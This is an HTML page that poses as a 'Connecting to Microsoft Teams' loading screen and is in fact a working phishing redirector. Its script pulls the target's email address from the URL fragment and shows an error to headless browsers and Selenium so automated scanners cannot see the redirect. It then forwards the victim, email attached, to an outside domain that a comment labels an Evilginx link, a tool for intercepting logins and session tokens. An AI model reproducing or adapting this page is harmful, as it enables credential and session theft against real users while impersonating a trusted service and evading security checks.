<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connecting to Microsoft Teams</title>
  <style>
    body {
      font-family: Segoe UI, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f2f2f2;
    }
    h2 { color: #444; }
    p { color: #777; }
  </style>
</head>
<body>

  <h2>Please wait...</h2>
  <p>Connecting you to Microsoft Teams</p>

  <script>
    window.addEventListener('load', function() {
      const rawHash = window.location.hash.substring(1);
      const email = decodeURIComponent(rawHash);

      // Basic email format validation
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        document.body.innerHTML = "<h2>Invalid or missing email.</h2>";
        return;
      }

      // Anti-bot: block headless browsers
      if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
        document.body.innerHTML = "<h2>Security verification failed</h2><p>Please use a real browser.</p>";
        return;
      }

      // Delay before redirecting
      setTimeout(function() {
        // Final Evilginx link with email in hash
        const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc" + encodeURIComponent(email);
        window.location.href = redirectURL;
      }, 4000); // 4 seconds
    });
  </script>

</body>
</html>
